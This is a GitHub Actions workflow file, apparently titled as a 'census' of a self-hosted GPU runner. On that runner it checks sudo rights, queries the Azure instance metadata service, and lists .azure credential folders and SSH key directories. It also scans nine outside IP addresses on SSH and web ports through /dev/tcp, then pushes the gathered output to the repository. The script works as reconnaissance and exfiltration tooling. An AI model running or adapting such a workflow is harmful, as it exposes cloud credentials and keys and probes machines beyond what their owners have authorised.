name: ul9060-census2
on: [workflow_dispatch]
permissions:
  contents: write
jobs:
  l40s:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: census
        run: |
          set +e
          F=/tmp/ul9060_census.txt
          {
          echo "=== UL9060 CENSUS run=$GITHUB_RUN_ID ts=$(date -u +%FT%TZ)"
          id; hostname; hostname -I; uname -a
          cat /proc/1/cgroup 2>/dev/null | head -2
          nvidia-smi -L
          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv
          echo "=== SUDO ==="; sudo -n -l 2>&1 | head -6
          echo "=== EGRESS ==="; curl -s -m 8 https://api.ipify.org; echo
          echo "=== IMDS ==="; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 400; echo
          echo "=== AZURE FILES ==="; ls -la /home/*/.azure /root/.azure 2>/dev/null | head -20
          echo "=== SSH KEYS ==="; ls -la /home/*/.ssh /root/.ssh 2>/dev/null | head -20
          echo "=== PEER :22 ==="
          for ip in 20.109.152.114 70.153.87.133 20.240.55.118 20.205.187.223 40.123.206.138 51.104.16.184 20.97.252.251 20.125.42.21 40.113.1.63; do
            for p in 22 443 8080; do
              timeout 5 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN" || echo "$ip:$p CLOSED"
            done
          done
          echo "=== DONE ==="
          } > "$F" 2>&1
          cat "$F"
      - name: keep
        run: |
          set +e
          git config user.email ul@local; git config user.name ul
          mkdir -p ul; cp /tmp/ul9060_census.txt ul/res_ul-l40s.txt
          git add ul/res_ul-l40s.txt; git commit -qm "res ul-l40s"; git push origin HEAD:main
          echo push_rc=$?
